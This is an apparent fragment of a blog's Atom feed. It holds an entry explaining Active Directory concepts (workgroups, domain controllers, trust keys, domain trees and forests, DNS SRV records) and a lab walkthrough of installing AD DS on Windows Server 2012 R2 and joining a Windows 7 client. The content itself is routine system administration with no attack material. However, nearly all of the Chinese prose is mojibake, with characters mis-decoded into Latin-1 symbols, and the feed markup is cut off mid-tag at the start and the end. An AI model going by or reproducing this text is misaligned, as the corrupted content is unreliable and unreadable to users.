&lt;p&gt;æ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œå¯ä»¥ä½¿ç”¨$b=â€%001111â€&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>åŸŸåŸºç¡€çŸ¥è¯†è§£æ</title>
    <link href="http://zer0yu.github.io/2018/08/24/AD-base-note/"/>
    <id>http://zer0yu.github.io/2018/08/24/AD-base-note/</id>
    <published>2018-08-24T06:34:12.000Z</published>
    <updated>2018-08-24T06:35:45.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-åŸºç¡€çŸ¥è¯†"><a href="#0x01-åŸºç¡€çŸ¥è¯†" class="headerlink" title="0x01 åŸºç¡€çŸ¥è¯†"></a>0x01 åŸºç¡€çŸ¥è¯†</h3><hr><h4 id="å·¥ä½œç»„"><a href="#å·¥ä½œç»„" class="headerlink" title="å·¥ä½œç»„"></a>å·¥ä½œç»„</h4><p><strong>å®šä¹‰</strong>ï¼šå…·æœ‰ä¸åŒåç§°çš„è®¡ç®—æœºå¯ä»¥å…·æœ‰ç›¸åŒçš„å·¥ä½œç»„åç§°ï¼Œä»è€Œå¯ä»¥åˆ©ç”¨å·¥ä½œç»„åç§°è¿›è¡Œå¿«é€Ÿç­›é€‰</p><p><strong>é—®é¢˜</strong>ï¼šæ²¡æœ‰åŠæ³•ç»Ÿä¸€ç®¡ç†ï¼ˆæ¯”å¦‚ç»Ÿä¸€å®‰è£…è½¯ä»¶ï¼‰ï¼›æ²¡åŠæ³•é›†ä¸­èº«ä»½éªŒè¯ï¼ˆå·¥ä½œç»„ä¸­çš„è®¡ç®—æœºç›¸äº’ç‹¬ç«‹ï¼Œç›¸äº’è®¿é—®æ—¶éœ€è¦è¾“å…¥å¯†ç çš„ï¼‰</p><p>ç”¨æˆ·åœ¨ç™»å½•æ—¶ï¼Œè®¡ç®—æœºä¸ºç”¨æˆ·æ„é€ ä»¤ç‰Œï¼ˆsidï¼‰ä»¥åŠç”¨æˆ·æ‰€åœ¨å·¥ä½œç»„çš„ä»¤ç‰Œï¼ˆsidï¼‰ï¼Œè®¡ç®—æœºå°†ä¾æ®å·¥ä½œç»„çš„sidæ¥åˆ¤æ–­å½“å‰ç”¨æˆ·çš„æƒé™</p><p><strong>é•œåƒè´¦æˆ·é—®é¢˜</strong>ï¼šåœ¨winserverè®¿é—®fileserverçš„æ—¶å€™ï¼Œå¦‚æœä¸¤å°è®¡ç®—æœºå­˜åœ¨ç›¸åŒçš„è´¦æˆ·å’Œå¯†ç ï¼Œå°†å¯ä»¥åœ¨winserverç›´æ¥è®¿é—®fileserverã€‚</p><h4 id="åŸŸ"><a href="#åŸŸ" class="headerlink" title="åŸŸ"></a>åŸŸ</h4><p><strong>åŸŸ</strong>ï¼šWindows Serverçš„æ ¸å¿ƒå•ä½</p><p>æ³¨ï¼š</p><p>æ´»åŠ¨ç›®å½•å’ŒåŸŸçš„å…³ç³»ï¼š</p><p>1.åŸŸæ˜¯é€»è¾‘ä¸Šçš„æœåŠ¡å™¨ä»¥åŠPCçš„é€»è¾‘åˆ†ç»„ï¼Œåœ¨ä¸€ä¸ªåŸŸé‡Œé¢çš„ç”¨æˆ·éƒ½ä½¿ç”¨å…¬å…±çš„å®‰å…¨æœºåˆ¶å’Œè´¦æˆ·ä¿¡æ¯ã€‚</p><p>2.æ´»åŠ¨ç›®å½•å°†åŸŸä¸­çš„èµ„æºç»„ç»‡åœ¨ä¸€èµ·ï¼Œå­˜æ”¾è¿™äº›èµ„æºçš„å„ç§ä¿¡æ¯ã€‚</p><p><strong>åŸŸæ§ï¼ˆDomain Controllerï¼‰ï¼ŒDC</strong>ï¼šå®‰è£…äº†ADçš„æœåŠ¡å™¨å°±æ˜¯åŸŸæ§åˆ¶å™¨ï¼Œå³æœ‰ADçš„è®¡ç®—æœºå°±æ˜¯DC</p><p><strong>æ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼‰ï¼ŒAD</strong>ï¼šæ´»åŠ¨ç›®å½•æ˜¯Windows Serveråœ¨ç½‘ç»œç¯å¢ƒä¸­æä¾›çš„â€œèµ„æºç›®å½•â€ã€‚æ´»åŠ¨ç›®å½•æ˜¯å‚¨å­˜ç€åŸŸä¸­ç›¸å…³èµ„æºä¿¡æ¯çš„ç›®å½•ï¼Œä¾‹å¦‚è®¡ç®—æœºï¼Œç”¨æˆ·ç»„ï¼Œæ•°æ®åº“ï¼ŒæœåŠ¡å™¨ï¼Œæ‰“å°æœºï¼Œç”¨æˆ·å±æ€§ï¼ˆæƒé™ç­‰ï¼‰ï¼Œå°±åƒä¸€ä¸ªæ•°æ®åº“ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/2229391424.png" alt="image"></p><p><strong>æ´»åŠ¨ç›®å½•ç›®å½•æœåŠ¡ï¼ˆActive Directory Directory Servicesï¼‰ï¼ŒADDS</strong>ï¼š<br>â€œThe Active Directory directory service is a distributed database that stores and manages information about network resources, as well as application-specific data from directory-enabled applications. Active Directory allows administrators to organize objects of a network (such as users, computers, and devices) into a hierarchical collection of containers known as the logical structure. The top-level logical container in this hierarchy is the forest. Within a forest are domain containers, and within domains are organizational units.â€</p><p>é¦–å…ˆå¤§å®¶éƒ½çŸ¥é“ç›®å½•ï¼Œç›®å½•æä¾›äº†æ–‡æ¡£å†…å®¹çš„æ¦‚è§ˆï¼Œå¯ä»¥ä½¿æˆ‘ä»¬è¿…é€Ÿæ‰¾åˆ°ä¸€æœ¬ä¹¦ï¼Œå­—å…¸ä¸­ç‰¹å®šçš„ç« èŠ‚ã€‚é‚£ä¹ˆå°†è¿™ä¸ªæ¦‚å¿µåº”ç”¨äºç½‘ç»œç®¡ç†å‘˜ç®¡ç†æœåŠ¡å™¨ä¸­ã€‚å‡è®¾ä¸€ä¸ªå…¬å¸ä¸­æœ‰ä¸€åƒå°æœåŠ¡å™¨ï¼Œç®¡ç†å‘˜æƒ³è¦æ‰¾åˆ°ç‰¹å®šçš„æœåŠ¡å™¨çš„è¯,ä¸€å°ä¸€å°çš„ç™»é™†ï¼Œæ˜¾ç„¶æ˜¯æå…¶ä½æ•ˆç‡çš„æ–¹æ³•ã€‚æ‰€ä»¥ç›®å½•çš„ç†å¿µåŒæ ·é€‚ç”¨åœ¨è§£å†³è¿™ç§æƒ…å†µã€‚</p><p>ADDSæä¾›ç»™åŸŸç®¡ç†ä¸€ä¸ªé›†ä¸­ç®¡ç†çš„æœºåˆ¶å’Œæ¶æ„ã€‚å‡è®¾ä¸€ä¸ªå…¬å¸ä¸­æœ‰ä¸€åƒå°æœåŠ¡å™¨ï¼Œç®¡ç†å‘˜æƒ³è¦æ‰¾åˆ°ç‰¹å®šçš„æœåŠ¡å™¨çš„è¯,ä¸€å°ä¸€å°çš„ç™»é™†ï¼Œæ˜¾ç„¶æ˜¯æå…¶ä½æ•ˆç‡çš„æ–¹æ³•ã€‚ADDSå¯ä»¥è®©åŸŸç®¡ç†å‘˜å¯¹ç½‘ç»œä¸­çš„æ‰€æœ‰èµ„æºè¿›è¡Œè®¿é—®ï¼ˆç™»é™†ï¼Œè¯»å†™ç­‰æ“ä½œï¼‰æˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£ä¸ºå•ç‚¹ç™»å½•ã€‚</p><p>æ´»åŠ¨ç›®å½•ç›®å½•æœåŠ¡æä¾›çš„åŠŸèƒ½</p><p>ï¼ˆ1ï¼‰æä¾›å•ç‚¹ç™»å½•è®¿é—®æœåŠ¡å™¨ã€æœåŠ¡å™¨ä¸ŠæŒ‡å®šçš„èµ„æºä¸åº”ç”¨ç¨‹åºã€‚</p><p>ï¼ˆ2ï¼‰å¤šæ’­å¤åˆ¶ï¼ˆReplicatiionï¼‰ï¼ï¼æš‚æ—¶ä¸å…³å¿ƒ</p><p>ï¼ˆ3ï¼‰åŸºäºå±æ€§æœç´¢ eg:åŸºäºæ–‡ä»¶åæœç´¢</p><p>ï¼ˆ4ï¼‰åŸºäºåˆ†ç±»æœç´¢ eg:åŸºäºåˆ†ç±»æœç´¢</p><p><strong>ä¿¡ä»»å¯†é’¥</strong>ï¼šè®¡ç®—æœºåœ¨åŠ å…¥åŸŸçš„æ—¶å€™éœ€è¦ç”±åŸŸç”¨æˆ·è¿›è¡Œâ€œä»‹ç»â€ï¼Œä¹‹åè®¡ç®—æœºå’ŒDCä¹‹é—´ä¼šå»ºç«‹ä¿¡ä»»å…³ç³»â€“å³ç”Ÿæˆåªæœ‰ä¸¤æ–¹çŸ¥é“çš„ä¿¡ä»»å¯†é’¥</p><p>æ³¨ï¼šé™¤åŸŸç®¡ç†å‘˜å¤–çš„åŸŸç”¨æˆ·ï¼Œé»˜è®¤å¯ä»¥åŠ å…¥åŸŸçš„è®¡ç®—æœºæ•°ç›®ä¸º10å°</p><p><strong>ä¿¡ä»»ä¸¢å¤±</strong>ï¼šè®¡ç®—æœºåœ¨è¢«è¿˜åŸå¡è¿˜åŸä¹‹åï¼Œå…¶ä¸­ä¿å­˜çš„ä¿¡ä»»å¯†é’¥ä¸DCä¸­çš„ä¿¡ä»»å¯†é’¥ä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ã€‚</p><p>æ³¨ï¼šå¦‚æœåŸŸä¸­è®¡ç®—æœºçš„SIDå‡ä¸ºä¸€æ ·çš„ï¼Œé‚£ä¹ˆDCå°†è®¤ä¸ºè¿™äº›è®¡ç®—æœºéƒ½æ˜¯ä¸€æ ·çš„ï¼Œæœ€ç»ˆå»ºç«‹çš„ä¿¡ä»»å¯†é’¥åªä¼šæœ‰æœ€åä¸€å°ã€‚è¿™ç§æƒ…å†µï¼Œå¸¸è§äºå¤šå°è®¡ç®—æœºä½¿ç”¨ghostè¿›è¡Œä¸€é”®è¿˜åŸå®‰è£…</p><p>ç»Ÿä¸€ç®¡ç†çš„å®ç°ï¼šåœ¨DCä¸Šå¯ä»¥åˆ¶å®šç»„ç­–ç•¥æˆ–è€…ç”¨æˆ·ç­–ç•¥ï¼Œé‚£ä¹ˆåŸŸå†…æ‰€æœ‰çš„è®¡ç®—æœºéƒ½å°†åº”ç”¨DCåˆ¶å®šçš„ç­–ç•¥ã€‚</p><p>æ³¨ï¼šè¿™ç§ä¼šä¼ é€’çš„ä¿¡ä»»å…³ç³»ï¼Œå®¹æ˜“å¯¼è‡´å…±äº«å†…å®¹çš„æ³„éœ²ï¼Œè¯¦æƒ…å‚è€ƒ<a href="http://lonelyrain.me/2017/10/10/%E5%9F%9F%E5%AE%89%E5%85%A8/" target="_blank" rel="noopener">ã€Šæ´»åŠ¨ç›®å½•ä»¥åŠåŸŸå®‰å…¨ã€‹</a></p><p><strong>åŸŸæ ‘ï¼ˆTreeï¼‰</strong>ï¼šä¸€ä¸ªåŸŸä¸‹è¿˜å¯èƒ½ä¼šæœ‰å­åŸŸï¼Œä»è€Œæ„æˆåŸŸæ ‘</p><p>æ³¨ï¼šæ ‘æ˜¯æœ‰çˆ¶å’Œå­ä¹‹åˆ†çš„ï¼Œçˆ¶åŸŸå’Œå­åŸŸçš„åç§°ä¹‹é—´æ˜¯æœ‰æ²¿ç”¨å…³ç³»çš„ï¼›æ ‘ä¸æ ‘ä¹‹é—´æ˜¯æ²¡æœ‰è¿™ç§å»¶ç”¨å…³ç³»çš„ï¼›æ–°åŸŸå°±æ˜¯ä¸€ä¸ªæ—ï¼Œåªä¸è¿‡è¿™ä¸ªæ—åªæœ‰ä¸€æ£µæ ‘ã€‚</p><p><strong>åŸŸæ—ï¼ˆForestï¼‰</strong>ï¼šå¤šä¸ªåŸŸæ ‘æ•´ä½“å°†æ„æˆåŸŸæ—</p><p>é›†ä¸­èº«ä»½éªŒè¯çš„å®ç°ï¼š</p><p>åŸŸç”¨æˆ·è´¦å·æ˜¯å¯ä»¥åœ¨åŸŸä¸­çš„å¤šå°è®¡ç®—æœºè¿›è¡Œç™»å½•çš„ã€‚å› ä¸ºåŸŸç”¨æˆ·çš„è´¦å·å¯†ç ä¸èƒ½ç›´æ¥åœ¨ä¼ è¾“ï¼Œå› ä¸ºä¸å®‰å…¨ï¼Œæ‰€ä»¥å°±æœ‰äº†NetlogonæœåŠ¡ï¼ŒNetlogonä¼šä½¿ç”¨è¢«ç™»å½•è®¡ç®—æœºä¸DCçš„ä¿¡ä»»å¯†é’¥å¯¹åŸŸç”¨æˆ·çš„è´¦å·å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œä¹‹åä¼ é€’ç»™DCè¿›è¡Œè§£å¯†éªŒè¯ï¼›éªŒè¯é€šè¿‡ä¹‹åï¼ŒDCä¼šå°†å¯¹åº”è´¦æˆ·çš„sidä¸è´¦æˆ·å¯†ç ä¸€èµ·åŠ å¯†ä¼ è¾“ç»™è¢«ç™»å½•è®¡ç®—æœºã€‚</p><p>åŸŸç”¨æˆ·åªè¦åœ¨åŸŸä¸­çš„ä¸€å°è®¡ç®—æœºè¿›è¡Œäº†ç™»å½•ï¼Œå°±å¯ä»¥é€šè¿‡æ­¤è®¡ç®—æœºè®¿é—®åŒåŸŸä¸‹çš„æ‰€æœ‰è®¡ç®—æœºã€‚å½“ç„¶ï¼Œå¦‚æœDCåäº†ï¼Œå°±æ— æ³•è¿›è¡ŒåŒåŸŸè®¿é—®äº†ï¼›ä½†æ˜¯è¿˜æ˜¯å¯ä»¥ç”¨ç¼“å­˜è¿‡å¾—èº«ä»½è¿›è¡Œç™»å½•ã€‚</p><p>åŒä¸€å·¥ä½œç»„ä¸­çš„è®¡ç®—æœºAè¦è®¿é—®åŸŸä¸­çš„è®¡ç®—æœºBä¸Šçš„å…±äº«èµ„æºçš„æ—¶å€™ï¼Œç‰µæ¶‰åˆ°è´¦å·å½’å±é—®é¢˜ï¼Œå³è´¦å·å½’å±åŸŸè¿˜æ˜¯å½’å±å·¥ä½œç»„ï¼Œè¿™ä¸ªå½’å±é—®é¢˜ç‰µæ¶‰åˆ°è´¦å·çš„éªŒè¯é—®é¢˜ï¼Œå› è€Œä¸ºäº†åŒºåˆ†å¿…é¡»åŠ ä¸Šå‰ç¼€ï¼Œæ¯”å¦‚ï¼šASERVER\ZEROYUå’ŒWORKGROUP\ZEROYU</p><h3 id="0x02-DNSå®šä½åŸŸæ§åˆ¶å™¨"><a href="#0x02-DNSå®šä½åŸŸæ§åˆ¶å™¨" class="headerlink" title="0x02 DNSå®šä½åŸŸæ§åˆ¶å™¨"></a>0x02 DNSå®šä½åŸŸæ§åˆ¶å™¨</h3><hr><p>DNSè´Ÿè´£å°†åŸŸåè§£ææˆIPåœ°å€</p><p>å†…ç½‘çš„DNSåˆ™å¯ä»¥å®šä½DCï¼ŒåŸŸä¼šæœ‰åç§°ï¼Œæ¯”å¦‚zerosã€‚åŸŸä¼šå‘DNSæ³¨å†Œè¿™ä¸ªåç§°ï¼Œå³SRVè®°å½•ã€‚åŸŸä¸­çš„è®¡ç®—æœºè®¿é—®SRVæ¥è¿›è€Œè®¿é—®DC</p><p>é€šå¸¸DNSå’ŒDCä¼šå®‰è£…åœ¨åŒä¸€è®¡ç®—æœºä¸Šï¼Œå› è€Œæ­¤è®¡ç®—çš„æœ¬åœ°è¿æ¥DNSè¦æŒ‡å‘è‡ªèº«</p><h3 id="0x03-ADçš„å®‰è£…"><a href="#0x03-ADçš„å®‰è£…" class="headerlink" title="0x03 ADçš„å®‰è£…"></a>0x03 ADçš„å®‰è£…</h3><hr><h4 id="ç¯å¢ƒï¼š"><a href="#ç¯å¢ƒï¼š" class="headerlink" title="ç¯å¢ƒï¼š"></a>ç¯å¢ƒï¼š</h4><p>VMware Workstation Pro<br>ç½‘ç»œå·¥ä½œåœ¨NATæ¨¡å¼</p><h4 id="step-1-é…ç½®é™æ€IPå’Œåç§°"><a href="#step-1-é…ç½®é™æ€IPå’Œåç§°" class="headerlink" title="step 1:é…ç½®é™æ€IPå’Œåç§°"></a>step 1:é…ç½®é™æ€IPå’Œåç§°</h4><p>ç»™æ¯å°è®¡ç®—æœºè®¾ç½®é™æ€IPï¼ˆå…¶å®åªè¦DCæ˜¯é™æ€IPå°±å¯ä»¥äº†ï¼‰ï¼Œè¿™é‡Œæˆ‘ä»¬ç»™æ¯å°è®¡ç®—æœºéƒ½è®¾ç½®é™æ€IPï¼Œä¸ºäº†æ–¹ä¾¿èµ·è§ï¼Œæˆ‘æŠŠè®¡ç®—æœºçš„åç§°ä¹Ÿè¿›è¡Œäº†ä¿®æ”¹ã€‚</p><p>Windows 2012 R2 - åç§°ï¼šDCServer - IP:192.168.11.129</p><p>Windows 7 - åç§°ï¼šwin7 - IP:192.168.11.128</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.30.19.png" alt></p><p>æ³¨ï¼šåœ¨æ­¤å¤„æˆ‘å°†DCServeræ—¢ä½œä¸ºDCåˆä½œä¸ºDNSï¼Œæ‰€ä»¥DCServerçš„DNSè¦æŒ‡å‘ä»–è‡ªèº«ã€‚æ˜¾ç„¶win7çš„DNSè¦æŒ‡å‘DCã€‚</p><h4 id="step-2-å®‰è£…Domain-Controllerå’ŒDNSæœåŠ¡"><a href="#step-2-å®‰è£…Domain-Controllerå’ŒDNSæœåŠ¡" class="headerlink" title="step 2:å®‰è£…Domain Controllerå’ŒDNSæœåŠ¡"></a>step 2:å®‰è£…Domain Controllerå’ŒDNSæœåŠ¡</h4><p>å½“ç™»å½•æˆ‘ä»¬çš„Windows 2012 R2ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»ªè¡¨ç›˜ï¼Œå•å‡»æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½æ¥å®‰è£…DCå’ŒDNSæœåŠ¡</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.44.23.png" alt="image"></p><p>æ³¨ï¼šwindows server 2003ä¸­å¯ä»¥ä½¿ç”¨<code>dcpromo</code>æ¥å®‰è£…DCï¼Œä½†æ˜¯åœ¨2012åŠä»¥åæ­¤å‘½ä»¤å°±è¢«åºŸé™¤äº†ã€‚</p><p>æœåŠ¡å™¨è§’è‰²ä¹‹å‰çš„å‡ é¡¹ï¼Œä¸€ç›´ç‚¹ä¸‹ä¸€æ­¥å°±å¥½äº†ã€‚ç›´åˆ°é€‰æ‹©æœåŠ¡å™¨è§’è‰²è¿™ä¸ªæ ç›®ä¸­éœ€è¦é€‰æ‹©ä»¥ä¸‹ä¸¤é¡¹ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.57.35.png" alt="image"></p><p>ä¹‹åç»§ç»­é»˜è®¤ç‚¹ä¸‹ä¸€æ­¥å³å¯ï¼Œç›´è¾¾æœ€åå‹¾é€‰éœ€è¦é‡å¯å°±é‡å¯é€‰é¡¹å°±å¥½ã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8A%E5%8D%889.59.20.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.08.03.png" alt="image"></p><p>å› ä¸ºæˆ‘ä»¬è¿™æ˜¯æ­¤åŸŸä¸­çš„ç¬¬ä¸€å°DCï¼Œæ‰€ä»¥åœ¨æ­¤æˆ‘ä»¬é€‰æ‹©â€œæ·»åŠ æ–°æ—â€</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.46.15.png" alt="image"></p><p>æ­¤å¤„çš„åŸŸåŠŸèƒ½çº§åˆ«å’Œæ—åŠŸèƒ½çº§åˆ«åªæ˜¯ä¸ºäº†ä¿è¯ä¸åŸŸä¸­å…¶å®ƒDCçš„å…¼å®¹è€Œå·²ï¼Œæ­¤å¤„ä¸ç”¨è®¡è¾ƒï¼Œå¡«å†™å¥½å¯†ç ç‚¹å‡»ä¸‹ä¸€æ­¥å°±å¥½<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.47.55.png" alt="image"></p><p>å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰é…ç½®å¥½DNSï¼Œæ‰€ä»¥ä¼šæ˜¾ç¤ºè­¦å‘Šï¼Œä¸ç”¨ç®¡ï¼Œç›´æ¥ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œå®ƒä¼šè‡ªåŠ¨åœ°ä¸ºæˆ‘ä»¬é…ç½®å¥½DNS<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.51.10.png" alt="image"></p><p>åç§°é»˜è®¤ï¼Œç»§ç»­ç‚¹å‡»ä¸‹ä¸€æ­¥<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.54.56.png" alt="image"></p><p>åœ¨æ­¤å¤„å¯ä»¥è®¾ç½®æ•°æ®åº“ã€æ—¥å¿—ã€sysvolæ–‡ä»¶çš„ä½ç½®ï¼Œæˆ‘ä»¬é‡‡ç”¨é»˜è®¤ï¼Œç»§ç»­ä¸‹ä¸€æ­¥</p><p>æ³¨ï¼šç»„ç­–ç•¥æ˜¯æ”¾ç½®åœ¨sysvolç›®å½•ä¸‹çš„ï¼Œè¿™ä¸ªç›®å½•éœ€è¦å½“å‰åˆ†åŒºçš„æ ¼å¼ä¸ºNTFS</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.56.12.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%883.59.01.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.18.56.png" alt="image"></p><p>å¯ä»¥çœ‹åˆ°åœ¨é…ç½®æˆåŠŸä»¥åï¼Œæœ¬è´¦å·å°±ä¸å­˜åœ¨äº†ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯åŸŸè´¦å·<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.24.04.png" alt="image"></p><h3 id="0x04-ADå®‰è£…åçš„æ£€æŸ¥"><a href="#0x04-ADå®‰è£…åçš„æ£€æŸ¥" class="headerlink" title="0x04 ADå®‰è£…åçš„æ£€æŸ¥"></a>0x04 ADå®‰è£…åçš„æ£€æŸ¥</h3><hr><p>1.ä¿®æ”¹DNSåœ°å€ï¼ŒæŒ‡å‘è‡ªå·±çš„åœ°å€ï¼ˆæœ€å¥½ä¸è¦æ˜¯127.0.0.1ï¼‰</p><p>2.DNSçš„SRVè®°å½•ä¸å…¨ï¼Œå¯ä»¥é€šè¿‡é‡æ–°æœåŠ¡æ¥è§£å†³,é‡å¯æœåŠ¡çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop netlogon</span><br><span class="line"></span><br><span class="line">net start netlogon</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šå¦‚æœè®°å½•å°‘çš„è¯ï¼Œä¸‹é¢çš„è®¡ç®—æœºå¯ä»¥èƒ½æ‰¾ä¸åˆ°åŸŸæ§åˆ¶å™¨</p><p>å®Œæ•´çš„DNS SRVè®°å½•å¦‚ä¸‹æ‰€ç¤º<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.31.05.png" alt="image"></p><p>3.æŸ¥çœ‹DCçš„å®Œæ•´åç§°</p><p>å¯ä»¥çœ‹åˆ°å…¶åç§°åé¢åŠ ä¸Šäº†åŸŸçš„åç§°<br><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.34.11.png" alt></p><p>4.æ´»åŠ¨ç›®å½•å’Œè®¡ç®—æœºç®¡ç†å·¥å…·</p><h3 id="0x05-DNSä¸­SRVè®°å½•æ³¨å†Œ"><a href="#0x05-DNSä¸­SRVè®°å½•æ³¨å†Œ" class="headerlink" title="0x05 DNSä¸­SRVè®°å½•æ³¨å†Œ"></a>0x05 DNSä¸­SRVè®°å½•æ³¨å†Œ</h3><hr><p>1.å‚ç…§4.2ï¼Œå¼ºåˆ¶åŸŸæ§åˆ¶å™¨å‘DNSæ³¨å†ŒSRVè®°å½•</p><p>2äººå·¥è¿›è¡Œåˆ›å»ºï¼Œå¦‚æœåˆ›å»ºä¹‹åè¿˜ä¸å…¨ï¼Œç›´æ¥é‡å¯Netlogonå³å¯ã€‚</p><p>æ³¨ï¼šå…¶ä¸­æœ‰ä¸€ä¸ªä¸å˜çš„è®°å½•â€“â€œ_msdcs.åŸŸåâ€</p><p>3.å§”æ´¾</p><h3 id="0x06-å°†è®¡ç®—æœºåŠ å…¥åŸŸ"><a href="#0x06-å°†è®¡ç®—æœºåŠ å…¥åŸŸ" class="headerlink" title="0x06 å°†è®¡ç®—æœºåŠ å…¥åŸŸ"></a>0x06 å°†è®¡ç®—æœºåŠ å…¥åŸŸ</h3><hr><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>åœ¨å®¢æˆ·ç«¯è®¡ç®—æœºä¸Šï¼Œæˆ‘ä»¬é¦–å…ˆè¦ç¡®ä¿æˆ‘ä»¬å¯ä»¥pingé€šzeroyu.lab</p><p>æ³¨ï¼šå¦‚æœpingä¸é€šçš„è¯ï¼Œæ£€æµ‹ä¸€ä¸‹å®¢æˆ·ç«¯è®¡ç®—æœºçš„DNSå€¼æ˜¯å¦è®¾ç½®ä¸ºäº†DCçš„IPå€¼ï¼ˆå› ä¸ºåœ¨è¿™ä¸ªå†…ç½‘ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬çš„DCè¿˜æœ‰DNSçš„è§’è‰²ï¼‰</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.28.32.png" alt="image"></p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2:"></a>step 2:</h4><p>åœ¨ä¿®æ”¹è®¡ç®—æœºåç§°çš„åœ°æ–¹ï¼Œå°†éš¶å±äºå·¥ä½œç»„ä¿®æ”¹ä¸ºéš¶å±äºåŸŸå¹¶å†™ä¸Šæˆ‘ä»¬çš„åŸŸåã€‚ä¹‹åï¼Œå¦‚æœæ²¡æœ‰é—®é¢˜çš„è¯ï¼Œå°±ä¼šè®©ä½ è¾“å…¥ä¸€ä¸ªåŸŸè´¦æˆ·ï¼ŒåŸŸè´¦æˆ·éªŒè¯é€šè¿‡ä¹‹åè®¡ç®—æœºå°±æˆåŠŸåŠ å…¥äº†åŸŸã€‚</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.38.59.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.45.06.png" alt="image"></p><h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3:"></a>step 3:</h4><p>æˆ‘ä»¬å¯ä»¥åˆ›å»ºåŸŸè´¦æˆ·æ¥ç™»å½•å·²ç»åŠ å…¥åŸŸçš„è®¡ç®—æœº</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.49.43.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.51.11.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.51.35.png" alt="image"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-16%20%E4%B8%8B%E5%8D%884.55.49.png" 